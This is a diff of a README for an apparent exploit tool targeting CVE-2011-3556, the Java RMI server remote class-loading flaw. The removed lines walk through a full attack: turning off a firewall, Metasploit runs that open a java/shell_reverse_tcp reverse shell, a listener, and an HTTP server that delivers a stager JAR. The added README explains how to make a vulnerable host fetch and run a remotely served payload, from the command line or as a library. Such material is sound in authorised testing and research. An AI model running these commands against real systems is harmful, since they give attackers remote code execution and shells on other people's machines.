@@ -1,19 +1,50 @@
-# 192.168.1.80 -- Update/upgrade Metasploit
-apt-get update -y && apt-get dist-upgrade -y
+# CVE-2011-3556 - Proof of Concept (PoC)
 
-# 192.168.1.71 -- Disable packet filtering
-/usr/libexec/ApplicationFirewall/socketfilterfw --setblockall off
+## Disclaimer
 
-# 192.168.1.80 -- Use the exploit java/shell_reverse_tcp against the target and save the stage sniffed through the network as stager.jar.
-msfconsole -q -x "use exploit/multi/misc/java_rmi_server;set payload java/shell_reverse_tcp;set rhost 192.168.1.77;set lhost 192.168.1.80;set lport 3099;run;exit -y"
+This tool is a Python 3 implementation of an existing [proof of concept (PoC)](https://www.exploit-db.com/raw/17535) made by mihi for the [Metasploit Framework](https://www.metasploit.com/).
 
-# 192.168.1.80 -- Launch the Metasploit handler exploit/multi/handler on the listening host and port specified.
-msfconsole -q -x "use exploit/multi/handler;set payload java/shell_reverse_tcp;set lhost 192.168.1.80;set lport 3099;run"
+## Prerequisites
 
-# 192.168.1.71 -- Launch the webserver that serves the stager and payload.
-python3 -m http.server --bind 192.168.1.71 2099
+To use the module, simply follow the instructions below:
 
-# 192.168.1.71 -- Launch the exploit using the URI pointing to stager.jar.
-./CVE-2011-3556.py --host 192.168.1.77 --uri http://192.168.1.71:2099/stage.jar --logging=DEBUG
+```sh
+# Clone this repository locally.
+$ git clone https://github.com/sk4la/cve_2011_3556.git && cd cve_2011_3556/
 
-# 192.168.1.80 -- Wait for a connection on the handler.
+# Optionally set the `x` bit to be able to execute the script directly.
+$ chmod u+x exploit.py
+
+$ ./exploit.py --help && echo "It works!"
+```
+
+## Usage
+
+### Command-line
+
+To be remotely loaded by the vulnerable Java RMI server, the payload (a JAR binary) must be served as an HTTP resource. One could quickly serve it using the famous `python3 -h http.server`.
+
+Once the payload is made available for download, simply execute the `exploit.py` script to trigger the vulnerability.
+
+```sh
+$ python3 -m http.server --bind <DELIVERY_HOST> <DELIVERY_PORT> &
+$ ./exploit.py -h <VULNERABLE_HOST> -u http://<DELIVERY_HOST>:<DELIVERY_PORT>/<PAYLOAD>`
+```
+
+> In case the payload is a Meterpreter (Metasploit Framework), do not forget to `use exploit/multi/handler`.
+
+### Library
+
+This module can be used as a library by importing the `cve_2011_3556` module to your current namespace:
+
+```python
+from cve_2011_3556 import JavaRMIExploit
+
+JavaRMIExploit("127.0.0.1", "http://127.0.0.1/payload.jar").exploit()
+```
+
+It's as simple as that!
+
+## Credits
+
+Special thanks to mihi for the initial implementation of the Metasploit Framework [module](https://www.exploit-db.com/raw/17535).
